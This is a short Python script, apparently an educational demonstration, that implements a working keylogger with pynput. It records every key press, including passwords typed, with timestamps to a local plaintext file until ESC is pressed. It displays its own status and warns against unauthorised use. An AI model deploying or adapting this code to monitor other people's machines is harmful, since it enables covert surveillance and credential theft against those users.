#!/usr/bin/env python3
"""
Basic Keylogger Program
Records and logs keystrokes to a file.

WARNING: This tool is for educational purposes only.
Use only on systems you own or have explicit permission to monitor.
Unauthorized use may be illegal.
"""

from pynput import keyboard
import logging
from datetime import datetime
import os


class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        """
        Initialize the keylogger.
        
        Args:
            log_file (str): Path to the log file where keystrokes will be saved
        """
        self.log_file = log_file
        self.setup_logging()
        
    def setup_logging(self):
        """Configure logging to write keystrokes to file."""
        log_format = '%(asctime)s - %(message)s'
        logging.basicConfig(
            filename=self.log_file,
            level=logging.INFO,
            format=log_format,
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        logging.info("Keylogger started")
        
    def on_press(self, key):
        """
        Callback function called when a key is pressed.
        
        Args:
            key: The key that was pressed
        """
        try:
            # Try to get the character representation
            key_data = key.char
            logging.info(f"Key pressed: {key_data}")
        except AttributeError:
            # Special keys (shift, ctrl, etc.)
            key_data = str(key)
            logging.info(f"Special key pressed: {key_data}")
            
    def on_release(self, key):
        """
        Callback function called when a key is released.
        
        Args:
            key: The key that was released
            
        Returns:
            False if ESC key is pressed to stop the listener
        """
        # Stop listener if ESC key is pressed
        if key == keyboard.Key.esc:
            logging.info("ESC pressed - Stopping keylogger")
            return False
            
    def start(self):
        """Start the keylogger."""
        print("Keylogger started. Press ESC to stop.")
        print(f"Logs are being saved to: {os.path.abspath(self.log_file)}")
        
        # Create and start the keyboard listener
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()
            
        print("Keylogger stopped.")


def main():
    """Main function to run the keylogger."""
    print("=" * 60)
    print("KEYLOGGER - Educational Tool")
    print("=" * 60)
    print("\nWARNING: This tool is for educational purposes only.")
    print("Use only on systems you own or have explicit permission.")
    print("=" * 60)
    print()
    
    # Create and start the keylogger
    keylogger = Keylogger()
    keylogger.start()


if __name__ == "__main__":
    main()
